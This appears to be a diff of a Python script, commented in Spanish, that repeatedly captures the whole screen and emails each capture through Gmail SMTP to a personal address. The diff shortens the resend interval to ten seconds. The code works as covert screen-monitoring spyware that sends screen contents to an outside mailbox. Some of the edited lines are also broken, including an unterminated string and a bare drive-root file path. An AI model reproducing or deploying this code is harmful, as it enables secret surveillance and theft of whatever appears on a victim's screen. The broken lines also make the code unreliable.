@@ -7,9 +7,10 @@ import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 #importamos librerias para adjuntar
-from email.MIMEBase import MIMEBase
+from email.mime.base import MIMEBase
 from email import encoders
 import os
+#instala con pip install ==0.51
 import autopy
 import time
 
@@ -17,7 +18,7 @@ import time
 def capture():
  # capturamos la pantalla
  screen = autopy.bitmap.capture_screen()
- screen.save('C:/Users/osmap/Documents')
+ screen.save('C:/)
 
 
 def mail():
@@ -26,7 +27,7 @@ def mail():
  ##se envia un mail a
  addr_to   = 'oscarmateo1997@gmail.com'
  ##el mail sale desde el correo
- addr_from = 'oscarmateo1997@gmail.com'
+ addr_from = 'mateo_penaherrera@yahoo.com'
 
  # Define SMTP email server details
  smtp_server = 'smtp.gmail.com:587'
@@ -43,7 +44,7 @@ def mail():
 
  #adjuntamos la captura de pantalla
  ##cargamos el archivo a adjuntar
- fp = open('C:/Users/osmap/Documents','rb')
+ fp = open('C:/','rb')
  adjunto = MIMEBase('multipart', 'encrypted')
  #lo insertamos en una variable
  adjunto.set_payload(fp.read())
@@ -77,6 +78,6 @@ def main():
   # Enviamos el correo
   mail()
   # Tiempo en segundos entre re-envios
-  time.sleep(60)
+  time.sleep(10)
 
 main()
